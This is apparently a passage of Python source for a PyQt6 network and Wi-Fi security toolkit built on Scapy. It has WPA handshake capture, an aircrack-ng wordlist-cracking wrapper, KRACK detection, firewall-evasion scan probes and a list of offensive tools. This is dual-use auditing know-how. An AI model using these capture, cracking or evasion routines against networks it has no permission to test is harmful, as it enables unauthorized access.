import sys
import logging
import time
from threading import Event, Lock
import queue
import copy
import socket
import random
import os
import csv
import platform
import psutil
import ipaddress
from PyQt6.QtCore import PYQT_VERSION_STR
import subprocess
import numpy as np
import json
import urllib.request
import tempfile
import webbrowser
import shutil

try:
    from lxml import etree
    LXML_AVAILABLE = True
except ImportError:
    LXML_AVAILABLE = False
    etree = None
    logging.warning("Optional XML reporting dependency not found. Please run 'pip install lxml'")

import re
from qt_material import apply_stylesheet, list_themes
from PyQt6.QtGui import QActionGroup, QPixmap, QImage, QPalette

def create_themed_icon(icon_path, color_str):
    """Loads an SVG, intelligently replaces its color, and returns a QIcon."""
    try:
        with open(icon_path, 'r', encoding='utf-8') as f:
            svg_data = f.read()

        # First, try to replace a stroke color in a style block (for paper-airplane.svg)
        themed_svg_data, count = re.subn(r'stroke:#[0-9a-fA-F]{6}', f'stroke:{color_str}', svg_data)

        # If no stroke was found in a style, fall back to injecting a fill attribute (for gear.svg)
        if count == 0 and '<svg' in themed_svg_data:
            themed_svg_data = themed_svg_data.replace('<svg', f'<svg fill="{color_str}"')

        image = QImage.fromData(themed_svg_data.encode('utf-8'))
        pixmap = QPixmap.fromImage(image)
        return QIcon(pixmap)
    except Exception as e:
        logging.warning(f"Could not create themed icon for {icon_path}: {e}")
        return QIcon(icon_path) # Fallback to original icon

def get_vendor(mac_address):
    """Retrieves the vendor for a given MAC address from an online API."""
    if not mac_address or mac_address == "N/A":
        return "N/A"
    try:
        # Use a timeout to prevent the application from hanging on network issues
        with urllib.request.urlopen(f"https://api.macvendors.com/{mac_address}", timeout=3) as url:
            data = url.read().decode()
            return data
    except Exception as e:
        logging.warning(f"Could not retrieve vendor for MAC {mac_address}: {e}")
        return "Unknown Vendor"

def _get_random_ip():
    """Generates a random, non-private IP address."""
    while True:
        ip = ".".join(str(random.randint(1, 223)) for _ in range(4))
        if not (ip.startswith('10.') or ip.startswith('192.168.') or (ip.startswith('172.') and 16 <= int(ip.split('.')[1]) <= 31)):
             return ip

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QStatusBar, QMenuBar, QTabWidget, QWidget,
    QVBoxLayout, QLabel, QDockWidget, QPlainTextEdit, QPushButton, QHBoxLayout,
    QTreeWidget, QTreeWidgetItem, QSplitter, QFileDialog, QMessageBox, QComboBox,
    QListWidget, QListWidgetItem, QScrollArea, QLineEdit, QCheckBox, QFrame, QMenu, QTextEdit, QGroupBox,
    QProgressBar, QTextBrowser, QRadioButton, QButtonGroup, QFormLayout, QGridLayout, QDialog,
    QHeaderView, QInputDialog, QGraphicsOpacityEffect
)
from PyQt6.QtCore import QObject, pyqtSignal, Qt, QThread, QTimer, QPropertyAnimation, QEasingCurve, QParallelAnimationGroup, QSequentialAnimationGroup, QPoint, QSize
from PyQt6.QtGui import QAction, QIcon, QFont, QTextCursor, QActionGroup


def sniffer_process_target(queue, iface, bpf_filter):
    """
    This function runs in a separate process. It sniffs packets and puts them
    into a multiprocessing.Queue. This completely isolates the blocking
    sniff() call from the main GUI application.
    """
    try:
        # The packet handler now simply puts the raw packet into the queue
        def packet_handler(packet):
            queue.put(bytes(packet))

        # We don't need a stop_filter anymore, as the process will be terminated directly.
        sniff(prn=packet_handler, iface=iface, filter=bpf_filter, store=False)
    except Exception as e:
        logging.error(f"Critical error in sniffer process: {e}", exc_info=True)


class KrackScanThread(QThread):
    vulnerability_detected = pyqtSignal(str, str) # bssid, client_mac

    def __init__(self, iface, parent=None):
        super().__init__(parent)
        self.iface = iface
        self.stop_event = Event()
        self.eapol_db = {} # { (bssid, client_mac): { replay_counter: count } }

    def _packet_handler(self, pkt):
        if not pkt.haslayer(EAPOL) or not pkt.haslayer(Dot11):
            return

        # Check if frame is going from AP to client (To DS=0, From DS=1)
        if pkt.FCfield & 0x3 != 1:
            return

        try:
            # Key Information field is a good indicator for Message 3
            key_info = pkt[EAPOL].key_info
            # Message 3: Pairwise, Install, Ack, MIC
            # Install = bit 6 (0x40), Ack = bit 7 (0x80), MIC = bit 8 (0x100)
            is_msg3 = (key_info & 0x1c0) == 0x1c0

            if is_msg3:
                bssid = pkt.addr2
                client_mac = pkt.addr1
                replay_counter = pkt[EAPOL].replay_counter

                key = (bssid, client_mac)

                if key not in self.eapol_db:
                    self.eapol_db[key] = {}

                if replay_counter not in self.eapol_db[key]:
                    self.eapol_db[key][replay_counter] = 1
                else:
                    # If we see the same replay counter again, it's a retransmission
                    self.eapol_db[key][replay_counter] += 1
                    if self.eapol_db[key][replay_counter] == 2:
                        logging.info(f"KRACK vulnerability detected! BSSID: {bssid}, Client: {client_mac}")
                        self.vulnerability_detected.emit(bssid, client_mac)
                        # Reset counter to avoid flooding with signals for the same retransmission
                        self.eapol_db[key][replay_counter] = 0


        except (IndexError, AttributeError) as e:
            logging.debug(f"Error processing EAPOL packet for KRACK scan: {e}")

    def run(self):
        logging.info(f"KRACK scanner started on interface {self.iface}")
        while not self.stop_event.is_set():
            try:
                sniff(iface=self.iface, prn=self._packet_handler, filter="ether proto 0x888e", timeout=1)
            except Exception as e:
                logging.error(f"Error in KRACK sniffer loop: {e}", exc_info=True)
                time.sleep(1)

    def stop(self):
        self.stop_event.set()


class AircrackThread(QThread):
    """A thread to run the aircrack-ng process and emit its output."""
    output_received = pyqtSignal(str)
    finished_signal = pyqtSignal(int)

    def __init__(self, pcap_file, wordlist, parent=None, threads=1):
        super().__init__(parent)
        self.pcap_file = pcap_file
        self.wordlist = wordlist
        self.threads = threads
        self.process = None

    def run(self):
        command = ["aircrack-ng", "-w", self.wordlist, "-p", str(self.threads), self.pcap_file]
        try:
            self.process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in iter(self.process.stdout.readline, ''):
                self.output_received.emit(line.strip())
            self.process.stdout.close()
            return_code = self.process.wait()
            self.finished_signal.emit(return_code)
        except FileNotFoundError:
            self.output_received.emit("ERROR: 'aircrack-ng' command not found. Please ensure it is installed and in your system's PATH.")
            self.finished_signal.emit(-1)
        except Exception as e:
            self.output_received.emit(f"An unexpected error occurred: {e}")
            self.finished_signal.emit(-1)

    def stop(self):
        if self.process and self.process.poll() is None:
            self.process.terminate()
            self.process.wait()
            logging.info("Aircrack-ng process terminated.")

try:
    from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph
    from reportlab.lib.styles import getSampleStyleSheet
    from reportlab.lib import colors
    from reportlab.lib.units import inch
    import docx
except ImportError:
    logging.warning("Optional PDF/DOCX export dependencies not found. Please run 'pip install reportlab python-docx'")

try:
    import pyqtgraph as pg
    PYQTGRAPH_AVAILABLE = True
except ImportError:
    PYQTGRAPH_AVAILABLE = False
    pg = None # Define pg as None to prevent other errors if it's referenced
    logging.warning("Optional graphing dependency not found. Please run 'pip install pyqtgraph'")


try:
    import GPUtil
except ImportError:
    GPUtil = None
    logging.warning("Optional GPU monitoring dependency not found. Please run 'pip install gputil'")

# --- Scapy Imports ---
try:
    from scapy.all import *
    from scapy.utils import hexdump
    from scapy.layers.dns import DNS, DNSQR
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap
    conf.verb = 0
except ImportError:
    logging.critical("Scapy is not installed.")

# --- Constants ---
AVAILABLE_PROTOCOLS = {"Ethernet": Ether, "ARP": ARP, "IP": IP, "IPv6": IPv6, "TCP": TCP, "UDP": UDP, "ICMP": ICMP, "DNS": DNS, "Raw": Raw}
PACKET_TEMPLATES = {
    "ICMP Ping (google.com)": [IP(dst="8.8.8.8"), ICMP()],
    "DNS Query (google.com)": [IP(dst="8.8.8.8"), UDP(dport=53), DNS(rd=1, qd=DNSQR(qname="google.com"))],
    "TCP SYN (localhost:80)": [IP(dst="127.0.0.1"), TCP(dport=80, flags="S")],
    "ARP Request (who-has 192.168.1.1)": [Ether(dst="ff:ff:ff:ff:ff:ff"), ARP(pdst="192.168.1.1")],
    "NTP Query (pool.ntp.org)": [IP(dst="pool.ntp.org"), UDP(sport=123, dport=123), NTP()],
    "SNMP GetRequest (public)": [IP(dst="127.0.0.1"), UDP(), SNMP(community="public", PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.1.0'))]))]
}
FIREWALL_PROBES = {
    "Standard SYN Scan (Top Ports)": [(lambda t: IP(dst=t)/TCP(dport=p, flags="S"), f"TCP SYN to port {p}") for p in [21, 22, 25, 53, 80, 110, 143, 443, 445, 3389, 8080]],
    "Stealthy Scans (FIN, Xmas, Null)": [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="F"), f"FIN Scan to port {p}") for p in [80, 443]
    ] + [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="FPU"), f"Xmas Scan to port {p}") for p in [80, 443]
    ] + [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags=""), f"Null Scan to port {p}") for p in [80, 443]
    ],
    "ACK Scan (Firewall Detection)": [(lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="A"), f"ACK Scan to port {p}") for p in [22, 80, 443]],
    "Source Port Evasion (DNS)": [(lambda t, p=p: IP(dst=t)/TCP(sport=53, dport=p, flags="S"), f"SYN from port 53 to {p}") for p in [80, 443, 8080]],
    "Fragmented SYN Scan": [(lambda t, p=p: fragment(IP(dst=t)/TCP(dport=p, flags="S")), f"Fragmented SYN to port {p}") for p in [80, 443]],
    "TCP Options Probes (WScale, TS)": [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="S", options=[('WScale', 10), ('Timestamp', (12345, 0))]), f"SYN+WScale+TS to port {p}") for p in [80, 443]
    ],
    "ECN Flag Probes": [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="SE"), f"SYN+ECE to port {p}") for p in [80, 443]
    ] + [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="SC"), f"SYN+CWR to port {p}") for p in [80, 443]
    ],
    "HTTP Payload Probe": [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="PA")/Raw(load="GET / HTTP/1.0\r\n\r\n"), f"HTTP GET probe to port {p}") for p in [80, 8080, 443]
    ],
    "Common UDP Probes": [(lambda t, p=p: IP(dst=t)/UDP(dport=p), f"UDP Probe to port {p}") for p in [53, 123, 161]],
    "ICMP Probes (Advanced)": [
        (lambda t: IP(dst=t)/ICMP(type=ty), f"ICMP Echo Request (Type 8)") for ty in [8]
    ] + [
        (lambda t: IP(dst=t)/ICMP(type=ty), f"ICMP Timestamp Request (Type 13)") for ty in [13]
    ] + [
        (lambda t: IP(dst=t)/ICMP(type=ty), f"ICMP Address Mask Request (Type 17)") for ty in [17]
    ]
}
SCAN_TYPES = ["TCP SYN Scan", "TCP FIN Scan", "TCP Xmas Scan", "TCP Null Scan", "TCP ACK Scan", "UDP Scan"]
COMMON_FILTERS = [
    "", "tcp", "udp", "arp", "icmp",
    "port 80", "port 443", "udp port 53", "tcp port 22",
    "host 8.8.8.8", "net 192.168.1.0/24", "vlan"
]

COMMUNITY_TOOLS = {
    "Interpreters and REPLs": [
        ("scapy-console", "https://github.com/gpotter2/scapy-console", "A Scapy console with many other tools and features."),
        ("Scapy REPL", "https://github.com/GabrielCama/scapy-repl", "An interactive Scapy REPL with customized commands.")
    ],
    "Networking": [
        ("bettercap", "https://github.com/bettercap/bettercap", "A powerful, flexible and portable tool for network attacks and monitoring."),
        ("Routersploit", "https://github.com/threat9/routersploit", "An open-source exploitation framework dedicated to embedded devices."),
        ("Batfish", "https://www.batfish.org/", "A network configuration analysis tool for validating and verifying network designs.")
    ],
    "Network Scanners & Analyzers": [
        ("Wireshark", "https://www.wireshark.org/", "The world's foremost and widely-used network protocol analyzer."),
        ("Nmap", "https://nmap.org/", "The Network Mapper - a free and open source utility for network discovery and security auditing."),
        ("Zeek", "https://zeek.org/", "A powerful network analysis framework that is much different from a typical IDS."),
        ("BruteShark", "https://github.com/odedshimon/BruteShark", "An open-source, cross-platform network forensic analysis tool (NFAT).")
    ],
    "Wireless": [
        ("Kismet", "https://www.kismetwireless.net/", "A wireless network detector, sniffer, and intrusion detection system."),
        ("Airgeddon", "https://github.com/v1s1t0r1sh3r3/airgeddon", "A multi-use bash script for Linux systems to audit wireless networks."),
        ("wifiphisher", "https://github.com/wifiphisher/wifisher", "A rogue Access Point framework for conducting red team engagements or Wi-Fi security testing."),
        ("Wifite2", "https://github.com/derv82/wifite2", "A complete rewrite of the popular wireless network auditing tool, wifite.")
    ],
    "Password Cracking": [
        ("John the Ripper", "https://www.openwall.com/john/", "A fast password cracker, available for many operating systems."),
        ("Hashcat", "https://hashcat.net/hashcat/", "The world's fastest and most advanced password recovery utility."),
        ("hcxtools", "https://github.com/ZerBea/hcxtools", "Tools to convert Wi-Fi captures into hash formats for Hashcat or John.")
    ],
    "Web & API Security": [
        ("reNgine", "https://github.com/yogeshojha/rengine", "An automated reconnaissance framework for web applications."),
        ("Astra", "https://github.com/flipkart-incubator/Astra", "Automated Security Testing For REST APIs.")
    ],
    "Industrial Control Systems (ICS)": [
        ("Scapy-cip-enip", "https://github.com/scapy-cip/scapy-cip-enip", "An EtherNet/IP and CIP implementation for Scapy."),
        ("Scapy-dnp3", "https://github.com/scapy-dnp3/scapy-dnp3", "A DNP3 implementation for Scapy."),
        ("Scapy-modbus", "https://github.com/scapy-modbus/scapy-modbus", "A Modbus implementation for Scapy.")
    ]
}

class CrunchDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Crunch Wordlist Generator")
        layout = QVBoxLayout(self)
        form_layout = QFormLayout()

        self.min_len = QLineEdit("8")
        self.max_len = QLineEdit("8")
        self.charset = QLineEdit("abcdefghijklmnopqrstuvwxyz0123456789")
        self.output_file = QLineEdit()
        self.output_file.setReadOnly(True)

        browse_btn = QPushButton("Browse...")
        browse_btn.clicked.connect(self.browse_output)

        form_layout.addRow("Min Length:", self.min_len)
        form_layout.addRow("Max Length:", self.max_len)
        form_layout.addRow("Character Set:", self.charset)

        output_layout = QHBoxLayout()
        output_layout.addWidget(self.output_file)
        output_layout.addWidget(browse_btn)
        form_layout.addRow("Output File:", output_layout)

        layout.addLayout(form_layout)

        self.generate_button = QPushButton("Generate")
        self.generate_button.clicked.connect(self.accept)
        layout.addWidget(self.generate_button)

    def browse_output(self):
        file_path, _ = QFileDialog.getSaveFileName(self, "Save Wordlist", "", "Text Files (*.txt)")
        if file_path:
            self.output_file.setText(file_path)

    def get_values(self):
        return {
            "min": self.min_len.text(),
            "max": self.max_len.text(),
            "charset": self.charset.text(),
            "outfile": self.output_file.text()
        }

# --- Logging and Threads ---
class QtLogHandler(logging.Handler, QObject):
    """A custom logging handler that emits a Qt signal for each log record."""
    log_updated = pyqtSignal(str)
    def __init__(self): super().__init__(); QObject.__init__(self)
    def emit(self, record): self.log_updated.emit(self.format(record))

class SnifferThread(QThread):
    """
    This QThread does not sniff itself. Instead, it manages a separate
    multiprocessing.Process for sniffing to prevent the GUI from freezing.
    It communicates with the main thread exclusively via thread-safe Qt signals
    that carry raw bytes, not complex objects.
    """
    packet_bytes_received = pyqtSignal(bytes)

    def __init__(self, iface, bpf_filter, parent=None):
        super().__init__(parent)
        self.iface = iface
        self.bpf_filter = bpf_filter
        self.process = None
        self.queue = None
        self.stop_event = Event()

    def run(self):
        from multiprocessing import Process, Queue
        self.queue = Queue()
        self.process = Process(
            target=sniffer_process_target,
            args=(self.queue, self.iface, self.bpf_filter)
        )
        self.process.start()
        logging.info(f"Sniffer process started with PID: {self.process.pid}")

        while not self.stop_event.is_set():
            try:
                # Use a timeout on the queue to remain responsive
                pkt_bytes = self.queue.get(timeout=0.5)
                # Emit the raw bytes. Reconstruction will happen in the main thread.
                self.packet_bytes_received.emit(pkt_bytes)
            except queue.Empty:
                continue
            except Exception as e:
                logging.error(f"Error in SnifferThread queue loop: {e}")

        logging.info("SnifferThread manager loop stopped.")


    def stop(self):
        logging.info("Stopping sniffer manager thread and process...")
        self.stop_event.set()
        if self.process and self.process.is_alive():
            logging.info(f"Terminating sniffer process {self.process.pid}...")
            self.process.terminate()
            self.process.join(timeout=2) # Wait for the process to terminate
            if self.process.is_alive():
                logging.warning(f"Sniffer process {self.process.pid} did not terminate gracefully, killing.")
                self.process.kill()
            logging.info("Sniffer process stopped.")

class ChannelHopperThread(QThread):
    """A thread to automatically hop Wi-Fi channels on Linux for scanning."""
    def __init__(self, iface):
        super().__init__()
        self.iface = iface
        self.stop_event = Event()
    def run(self):
        if sys.platform != "linux":
            logging.warning("Channel hopping is only supported on Linux.")
            return
        logging.info(f"Channel hopper started for interface {self.iface}")
        channels = [1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10]
        while not self.stop_event.is_set():
            for ch in channels:
                if self.stop_event.is_set(): break
                try:
                    os.system(f"iwconfig {self.iface} channel {ch}")
                    time.sleep(0.5)
                except Exception as e:
                    logging.error(f"Failed to hop channel: {e}")
                    break
        logging.info("Channel hopper stopped.")
    def stop(self): self.stop_event.set()

class WorkerThread(QThread):
    """A generic QThread to run any function in the background."""
    def __init__(self, target, args=()): super().__init__(); self.target = target; self.args = args
    def run(self): self.target(*self.args)

class ResourceMonitorThread(QThread):
    """A thread that monitors and emits system resource usage statistics."""
    stats_updated = pyqtSignal(dict)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.stop_event = Event()
        self.is_paused = False
        self.interval = 1 # default interval

    def run(self):
        """The main loop for monitoring resources."""
        psutil.cpu_percent() # Initial call to prevent first reading from being 0.0
        last_disk_io = psutil.disk_io_counters()
        last_net_io = psutil.net_io_counters()

        while not self.stop_event.is_set():
            if self.is_paused:
                time.sleep(1)
                continue

            time.sleep(self.interval)

            if self.stop_event.is_set():
                break

            cpu_percent = psutil.cpu_percent()
            ram_percent = psutil.virtual_memory().percent

            # GPU Stats
            gpu_percent = 0
            if GPUtil:
                try:
                    gpus = GPUtil.getGPUs()
                    if gpus:
                        gpu = gpus[0] # Use the first GPU
                        gpu_percent = gpu.load * 100
                except Exception as e:
                    logging.debug(f"Could not retrieve GPU stats: {e}")


            disk_io = psutil.disk_io_counters()
            read_mb_s = (disk_io.read_bytes - last_disk_io.read_bytes) / (1024**2) / self.interval
            write_mb_s = (disk_io.write_bytes - last_disk_io.write_bytes) / (1024**2) / self.interval
            last_disk_io = disk_io

            net_io = psutil.net_io_counters()
            sent_kb_s = (net_io.bytes_sent - last_net_io.bytes_sent) / 1024 / self.interval
            recv_kb_s = (net_io.bytes_recv - last_net_io.bytes_recv) / 1024 / self.interval
            last_net_io = net_io

            stats = {
                "cpu_percent": cpu_percent,
                "ram_percent": ram_percent,
                "gpu_percent": gpu_percent,
                "disk_str": f"{read_mb_s:.2f}/{write_mb_s:.2f} MB/s",
                "net_str": f"{sent_kb_s:.2f}/{recv_kb_s:.2f} KB/s"
            }
            self.stats_updated.emit(stats)

    def set_interval(self, interval):
        self.interval = interval
        self.is_paused = False

    def pause(self):
        self.is_paused = True

    def stop(self):
        self.stop_event.set()

class HandshakeSnifferThread(QThread):
    """A specialized thread to capture WPA 4-way handshakes."""
    handshake_captured = pyqtSignal(str, str) # BSSID, file_path
    log_message = pyqtSignal(str)

    def __init__(self, iface, bssid, parent=None):
        super().__init__(parent)
        self.iface = iface
        self.bssid = bssid
        self.packets = []
        self.stop_event = Event()

    def run(self):
        self.log_message.emit(f"Starting handshake capture for BSSID: {self.bssid} on {self.iface}")
        try:
            sniff(iface=self.iface, prn=self._packet_handler, stop_filter=lambda p: self.stop_event.is_set(), filter="ether proto 0x888e")
        except Exception as e:
            self.log_message.emit(f"Handshake sniffer error: {e}")
        self.log_message.emit("Handshake sniffer stopped.")

    def _packet_handler(self, pkt):
        self.packets.append(pkt)
        # Simple check: once we have >= 4 EAPOL packets, save and stop.
        # A more robust implementation would check the actual handshake sequence.
        if len(self.packets) >= 4:
            self.log_message.emit("Potential handshake captured (4 EAPOL packets). Saving to file.")
            file_path = f"handshake_{self.bssid.replace(':', '')}.pcap"
            wrpcap(file_path, self.packets)
            self.handshake_captured.emit(self.bssid, file_path)
            self.stop()

    def stop(self):
        self.stop_event.set()

if PYQTGRAPH_AVAILABLE:
    class ResourceGraph(pg.PlotWidget):
        """A custom PlotWidget for displaying a scrolling resource graph."""
        def __init__(self, parent=None, title="", color='c', text_color=(221, 221, 221)):
            super().__init__(parent)
            self.setMouseEnabled(x=False, y=False)
            self.setMenuEnabled(False)
            self.getPlotItem().hideAxis('bottom')
            self.getPlotItem().hideAxis('left')
            self.setBackground(background=(40, 44, 52)) # Default to dark theme background
            self.setRange(yRange=(0, 100), padding=0)

            self.data = np.zeros(60) # 60 data points for a 1-minute history at 1s refresh
            self.curve = self.plot(self.data, pen=pg.mkPen(color, width=2))

            self.text = pg.TextItem(text="", color=text_color, anchor=(0.5, 0.5))
            self.text.setPos(30, 50) # Position it in the middle of the graph
            self.addItem(self.text)


        def update_data(self, new_value):
            """Shifts the data and adds a new value to the end."""
            self.data[:-1] = self.data[1:]
            self.data[-1] = new_value
            self.curve.setData(self.data)
            self.text.setText(f"{new_value:.0f}%")
else:
    # If pyqtgraph is not available, create a dummy widget to avoid crashing.
    class ResourceGraph(QWidget):
        def __init__(self, parent=None, title="", color='c', text_color=(221, 221, 221)):
            super().__init__(parent)
            layout = QVBoxLayout(self)
            label = QLabel("Graphs disabled\n(pyqtgraph not installed)")
            label.setAlignment(Qt.AlignmentFlag.AlignCenter)
            label.setStyleSheet("color: #888;")
            layout.addWidget(label)
            self.setMinimumHeight(60)
            # Make the placeholder visible
            self.setStyleSheet("background-color: #2d313a; border: 1px solid #444;")

        def update_data(self, new_value):
            """Dummy method, does nothing."""
            pass

class SubdomainResultsDialog(QDialog):
    """A dialog to show a list of found subdomains with an export option."""
    def __init__(self, subdomains, domain, parent=None):
        super().__init__(parent)
        self.setWindowTitle(f"Subdomain Scan Results for {domain}")
        self.setMinimumSize(500, 400)
        self.parent = parent # To access the export handler
        self.domain = domain # Store domain for context

        layout = QVBoxLayout(self)

        summary_label = QLabel(f"<b>Found {len(subdomains)} unique subdomains.</b>")
        layout.addWidget(summary_label)

        self.tree = QTreeWidget()
        self.tree.setColumnCount(1)
        self.tree.setHeaderLabels(["Subdomain"])
        for sub in subdomains:
            self.tree.addTopLevelItem(QTreeWidgetItem([sub]))
        self.tree.resizeColumnToContents(0)
        layout.addWidget(self.tree)

        button_layout = QHBoxLayout()
        export_button = self.parent._create_export_button(self.tree)
        analyze_button = QPushButton("Send to AI Analyst")
        analyze_button.clicked.connect(lambda: self.parent._send_to_ai_analyst("subdomain", self.tree, self.domain))
        button_layout.addWidget(export_button)
        button_layout.addWidget(analyze_button)
        ok_button = QPushButton("OK")
        ok_button.clicked.connect(self.accept)
        button_layout.addWidget(ok_button)

        layout.addLayout(button_layout)

class NmapSummaryDialog(QDialog):
    """A dialog to show a summary of Nmap scan results from XML."""
    def __init__(self, xml_data, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Nmap Scan Summary")
        self.setMinimumSize(700, 500)

        layout = QVBoxLayout(self)
        self.tree = QTreeWidget()
        self.tree.setColumnCount(4)
        self.tree.setHeaderLabels(["Host / Details", "Port", "Service", "Version"])
        self.tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
        self.tree.header().setStretchLastSection(False)
        layout.addWidget(self.tree)

        self.parse_and_populate(xml_data)

        for i in range(self.tree.columnCount()):
            self.tree.resizeColumnToContents(i)

        ok_button = QPushButton("OK")
        ok_button.clicked.connect(self.accept)
        layout.addWidget(ok_button)

    def parse_and_populate(self, xml_data):
        if not LXML_AVAILABLE:
            self.tree.addTopLevelItem(QTreeWidgetItem(["LXML library not installed."]))
            return
        if not xml_data:
            self.tree.addTopLevelItem(QTreeWidgetItem(["No XML data to parse."]))
            return

        try:
            parser = etree.XMLParser(recover=True, no_network=True, dtd_validation=False)
            root = etree.fromstring(xml_data.encode('utf-8'), parser=parser)

            for host in root.findall('host'):
                if host.find('status').get('state') != 'up':
                    continue

                address = host.find('address').get('addr')
                hostname_elem = host.find('hostnames/hostname')
                hostname = hostname_elem.get('name') if hostname_elem is not None else ""

                host_text = f"{address} ({hostname})" if hostname else address
                host_item = QTreeWidgetItem([host_text])
                host_item.setExpanded(True)
                self.tree.addTopLevelItem(host_item)

                ports_elem = host.find('ports')
                if ports_elem is None:
                    continue

                for port in ports_elem.findall('port'):
                    if port.find('state').get('state') == 'open':
                        port_id = port.get('portid')
                        protocol = port.get('protocol')

                        service_elem = port.find('service')
                        service = service_elem.get('name', '') if service_elem is not None else ''
                        version_parts = []
                        if service_elem is not None:
                            if service_elem.get('product'): version_parts.append(service_elem.get('product'))
                            if service_elem.get('version'): version_parts.append(service_elem.get('version'))
                        version = " ".join(version_parts)

                        port_item = QTreeWidgetItem(["", f"{port_id}/{protocol}", service, version])
                        host_item.addChild(port_item)

        except Exception as e:
            logging.error(f"Failed to parse Nmap XML for summary: {e}", exc_info=True)
            self.tree.addTopLevelItem(QTreeWidgetItem(["Error parsing XML data."]))

class FetchModelsThread(QThread):
    """A dedicated thread to fetch AI models from an endpoint."""
    models_fetched = pyqtSignal(list)
    models_error = pyqtSignal(str)

    def __init__(self, url, parent=None):
        super().__init__(parent)
        self.url = url

    def run(self):
        try:
            import requests
            response = requests.get(self.url, timeout=5)
            response.raise_for_status()
            data = response.json()
            model_names = [model['name'] for model in data.get('models', [])]
            self.models_fetched.emit(model_names)
        except Exception as e:
            self.models_error.emit(str(e))

class TestAPIThread(QThread):
    """A dedicated thread to test an API connection."""
    success = pyqtSignal(str)
    error = pyqtSignal(str)

    def __init__(self, provider, api_key, parent=None):
        super().__init__(parent)
        self.provider = provider
        self.api_key = api_key

    def run(self):
        try:
            import requests
            if self.provider == "OpenAI":
                url = "https://api.openai.com/v1/models"
                headers = {"Authorization": f"Bearer {self.api_key}"}
                response = requests.get(url, headers=headers, timeout=10)
                response.raise_for_status()
                # Check if we got a list of models
                if "data" in response.json():
                    self.success.emit(f"Successfully connected to {self.provider} and authenticated.")
                else:
                    self.error.emit(f"Authentication with {self.provider} failed. The response was unexpected.")
            else:
                self.error.emit(f"Connection testing for {self.provider} is not yet implemented.")
        except Exception as e:
            self.error.emit(f"Failed to connect to {self.provider}: {e}")

class AISettingsDialog(QDialog):
    """A dialog to configure the AI analysis feature."""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("AI Analysis Settings")
        self.setMinimumWidth(500)
        self.settings_file = "ai_settings.json"
        self.fetch_thread = None

        # Main layout
        main_layout = QVBoxLayout(self)

        # Tab widget
        self.tab_widget = QTabWidget()
        main_layout.addWidget(self.tab_widget)

        # --- Local AI Tab ---
        local_ai_widget = QWidget()
        local_ai_layout = QFormLayout(local_ai_widget)

        self.local_endpoint_edit = QLineEdit()
        detect_button = QPushButton("Detect Running Services")
        detect_button.clicked.connect(self.detect_local_services)
        local_ai_layout.addRow("API Endpoint URL:", self.local_endpoint_edit)
        local_ai_layout.addRow(detect_button)

        # Model selection with refresh
        model_layout = QHBoxLayout()
        self.local_model_combo = QComboBox()
        self.local_model_combo.setEditable(True)
        self.local_model_combo.setToolTip("Select an available model or type a custom one.")
        model_layout.addWidget(self.local_model_combo)
        self.refresh_button = QPushButton("Refresh List")
        self.refresh_button.clicked.connect(self.refresh_local_models)
        model_layout.addWidget(self.refresh_button)
        local_ai_layout.addRow("Model Name:", model_layout)

        self.tab_widget.addTab(local_ai_widget, "Local AI (Ollama, etc.)")

        # --- Online Services Tab ---
        online_ai_widget = QWidget()
        online_main_layout = QVBoxLayout(online_ai_widget)

        self.online_provider_tabs = QTabWidget()
        online_main_layout.addWidget(self.online_provider_tabs)

        # Create a dictionary to hold the widgets for each provider
        self.provider_widgets = {}

        # List of providers to add
        providers = ["OpenAI", "Gemini", "Grok", "DeepSeek", "Qwen"]

        for provider_name in providers:
            provider_widget = QWidget()
            provider_layout = QFormLayout(provider_widget)

            api_key_edit = QLineEdit()
            api_key_edit.setEchoMode(QLineEdit.EchoMode.Password)

            model_edit = QLineEdit()

            test_button = QPushButton("Test Connection")

            # Enable the button only for implemented providers
            if provider_name == "OpenAI":
                test_button.setEnabled(True)
                test_button.clicked.connect(lambda checked, p=provider_name: self._test_api_connection(p))
            else:
                test_button.setEnabled(False)

            provider_layout.addRow(f"{provider_name} API Key:", api_key_edit)
            provider_layout.addRow("Model Name:", model_edit)
            provider_layout.addRow(test_button)

            self.provider_widgets[provider_name] = {
                'api_key': api_key_edit,
                'model': model_edit,
                'test_btn': test_button
            }
            self.online_provider_tabs.addTab(provider_widget, provider_name)

        self.tab_widget.addTab(online_ai_widget, "Online Services")

        # --- Save/Cancel Buttons ---
        button_layout = QHBoxLayout()
        save_button = QPushButton("Save")
        save_button.clicked.connect(self.save_settings)
        cancel_button = QPushButton("Cancel")
        cancel_button.clicked.connect(self.reject)
        button_layout.addStretch()
        button_layout.addWidget(save_button)
        button_layout.addWidget(cancel_button)
        main_layout.addLayout(button_layout)

        self.load_settings()

    def detect_local_services(self):
        """Tries to detect common local AI endpoints by checking for open ports."""
        known_services = {
            "Ollama": {"port": 11434, "path": "/api/chat"},
            "LMStudio": {"port": 1234, "path": "/v1/chat/completions"}
        }
        detected_services = []

        for name, details in known_services.items():
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.1) # Quick timeout
                    s.connect(("localhost", details["port"]))
                detected_services.append(name)
            except (socket.timeout, ConnectionRefusedError):
                continue

        if not detected_services:
            QMessageBox.information(self, "Detection Result", "No running local AI services (Ollama, LMStudio) could be detected on their default ports.")
        elif len(detected_services) == 1:
            service_name = detected_services[0]
            port = known_services[service_name]["port"]
            path = known_services[service_name]["path"]
            endpoint = f"http://localhost:{port}{path}"
